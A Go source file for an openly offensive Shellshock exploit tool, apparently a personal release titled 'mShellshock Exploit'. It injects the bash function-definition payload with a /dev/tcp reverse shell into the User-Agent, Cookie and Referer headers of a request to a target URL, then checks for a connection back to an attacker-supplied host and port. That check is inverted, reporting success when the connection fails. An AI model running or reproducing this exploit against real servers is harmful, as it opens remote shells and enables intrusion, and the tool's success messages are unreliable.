package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

const BANNER = `
*********************************************************************************			
*         _________.__           .__  .__         .__                   __    	*
*  _____  /   _____/|  |__   ____ |  | |  |   _____|  |__   ____   ____ |  | __	*
* /     \ \_____  \ |  |  \_/ __ \|  | |  |  /  ___/  |  \ /  _ \_/ ___\|  |/ /	*
*|  Y Y  \/        \|   Y  \  ___/|  |_|  |__\___ \|   Y  (  <_> )  \___|    < 	*
*|__|_|  /_______  /|___|  /\___  >____/____/____  >___|  /\____/ \___  >__|_ \	*
*      \/        \/      \/     \/               \/     \/            \/     \/ *
*                                                                   			*
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+                          *
*            |E|x|p|l|o|i|t| |b|y|    | m | o | n | i |                         *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+                 			*
*                                                                   			*
*                                                                               *   
*********************************************************************************
`

func main() {
	fmt.Println(BANNER)

	lhost := flag.String("LHOST", "", "IP Address on which the reverse shell should connect back to")
	lport := flag.String("LPORT", "", "Port on which the reverse shell should connect back to")
	targetURL := flag.String("TARGET_URL", "", "URL to carry the exploit on")
	flag.Parse()

	if *lhost == "" || *lport == "" || *targetURL == "" {
		flag.Usage()
		os.Exit(1)
	}

	protocol := setProtocol(*targetURL)

	rhost, err := resolveHost(*targetURL)
	if err != nil {
		fmt.Println("[-] Error resolving host:", err)
		os.Exit(1)
	}

	rport := setPort(*targetURL, protocol)

	host := fmt.Sprintf("%s:%d", rhost, rport)

	fmt.Printf("[+] Protocol detected: %s\n", strings.ToUpper(protocol))
	sendPayload(setPayload(*lhost, *lport, *targetURL, rhost), *lhost, *lport, *targetURL, protocol, host)
}

func setProtocol(url string) string {
	if strings.HasPrefix(url, "https") {
		return "https"
	}
	return "http"
}

func resolveHost(url string) (string, error) {
	host := strings.Split(strings.Split(url, "/")[2], ":")[0]
	addrs, err := net.LookupHost(host)
	if err != nil {
		return "", err
	}
	return addrs[0], nil
}

func setPort(url, protocol string) int {
	parts := strings.Split(url, "/")[2]
	if strings.Contains(parts, ":") {
		port := strings.Split(parts, ":")[1]
		return atoi(port)
	}
	if protocol == "https" {
		return 443
	}
	return 80
}

func atoi(str string) int {
	result, err := strconv.Atoi(str)
	if err != nil {
		return 0
	}
	return result
}

func setPayload(lhost, lport, targetURL, rhost string) *http.Request {
	fmt.Println("\n[+] Setting Payload ...")

	payload := "() { :; }; "
	reverseShell := fmt.Sprintf("/bin/bash -c /bin/bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)

	req, _ := http.NewRequest("GET", targetURL, nil)
	headers := map[string]string{
		"User-Agent":      payload + reverseShell,
		"Cookie":          payload + reverseShell,
		"Host":            rhost,
		"Referer":         payload + reverseShell,
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	return req
}

func sendPayload(req *http.Request, lhost, lport, targetURL, protocol, host string) {
	fmt.Printf("[+] Sending Payload to %s ...\n", targetURL)

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	if protocol == "https" {
		for tlsVersion, tlsConfig := range getTLSVersions() {
			fmt.Printf("[+] Trying to send payload over SSL with %s ...\n", tlsVersion)
			client.Transport = &http.Transport{
				TLSClientConfig: tlsConfig,
			}
			sendHTTPRequest(client, req, targetURL)
		}
	} else {
		sendHTTPRequest(client, req, targetURL)
	}

	testRevShell(lhost, lport, host)
}

func getTLSVersions() map[string]*tls.Config {
	return map[string]*tls.Config{
		"TLS Version 1.2": {MinVersion: tls.VersionTLS12},
		"TLS Version 1.1": {MinVersion: tls.VersionTLS11},
		"TLS Version 1.0": {MinVersion: tls.VersionTLS10},
	}
}

func sendHTTPRequest(client *http.Client, req *http.Request, targetURL string) {
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("\n[-] Error: %v - Couldn't send payload to %s.\n", err, targetURL)
		os.Exit(1)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusInternalServerError {
		fmt.Printf("\n[-] HTTP %d - Couldn't send payload to %s.\n", resp.StatusCode, targetURL)
		os.Exit(1)
	}
	time.Sleep(1 * time.Second)
}

func testRevShell(lhost, lport, host string) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(lhost, lport), 5*time.Second)
	if err != nil {
		fmt.Printf("\n[+] Reverse shell from %s connected to [%s:%s].\n", host, lhost, lport)
		fmt.Println("\n[+] Payload Sent successfully!")
		return
	}
	conn.Close()
	fmt.Println("\n[-] Couldn't create Reverse shell")
	os.Exit(1)
}
